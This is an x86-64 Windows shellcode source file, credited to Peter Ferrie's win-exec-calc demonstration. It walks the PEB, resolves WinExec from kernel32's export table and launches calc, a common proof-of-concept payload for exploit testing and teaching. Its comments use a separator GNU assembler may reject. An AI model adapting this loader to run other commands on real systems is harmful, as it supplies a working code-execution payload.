;; Code derived from Peter Ferrie <peter.ferrie@gmail.com>
;; see:
;; https://github.com/peterferrie/win-exec-calc-shellcode
;; for a better explanation of the code

;; As the Copyright message below:

;; Copyright (c) 2009-2014 Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
;; and Peter Ferrie <peter.ferrie@gmail.com>
;; All rights reserved.
;; 
;; Redistribution and use in source and binary forms, with or without
;; modification, are permitted provided that the following conditions are met:
;;     * Redistributions of source code must retain the above copyright
;;       notice, this list of conditions and the following disclaimer.
;;     * Redistributions in binary form must reproduce the above copyright
;;       notice, this list of conditions and the following disclaimer in the
;;       documentation and/or other materials provided with the distribution.
;;     * Neither the name of the copyright holder nor the names of the
;;       contributors may be used to endorse or promote products derived from
;;       this software without specific prior written permission.
;; 
;; THIS SOFTWARE IS PROVIDED ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
;; INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
;; AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
;; COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
;; INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
;; NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
;; DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
;; THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
;; (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
;; SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


	.file "example2.S"

	.text
	.align 16	
	.globl _start
	.org 0x0, 0x0
	
_start:
	pushq	%rbp
	subq	$0x40, %rsp		; make a stack frame
	movq	%gs:0x60, %rsi		; get PEB address
	movq	0x18(%rsi),%rsi  	; get PEB_LDR_DATA address
	movq	0x10(%rsi), %rsi 	; find kernel.dll
	movq	(%rsi), %rsi
	movq	(%rsi), %rsi
	movq	0x30(%rsi), %rdi 	; get Kernel dll Base
	xorq	%rdx, %rdx
	movq	$0x60, %rdx
	addl	0x3c(%rdi), %edx 	; Parse PE header
	movl	0x28(%rdi, %rdx), %ebx
	movl	0x20(%rdi, %rbx), %esi 	; address of names table
	addq	%rdi, %rsi
	movl	0x24(%rdi, %rbx), %edx 	; ordinals table
findexec:
	movzwl	(%rdi, %rdx), %ebp 	; Looping until find 'WinExec' string
	leal	0x2(%rdx), %edx
	lodsl	(%rsi)
	movabs	$0x636578456e6957, %r8
	cmpq	%r8, (%rdi, %rax)
	jne	findexec
	movl	0x1c(%rdi, %rbx), %esi
	addq	%rdi, %rsi
	movl	(%rsi, %rbp, 0x4), %esi
	addq	%rsi, %rdi 		; WinExec address
	cdq
	leaq	calcstr(%rip), %rcx 	; rcx points to string 'calc'
	movq	$0x5, %rdx
	callq	*%rdi 			; call WinExec
	addq	$0x40, %rsp 		; free the stack frame and return
	popq	%rbp
	ret
calcstr:	.byte	'c','a','l','c',0x0,0x0,0x0,0x0

	.end
	
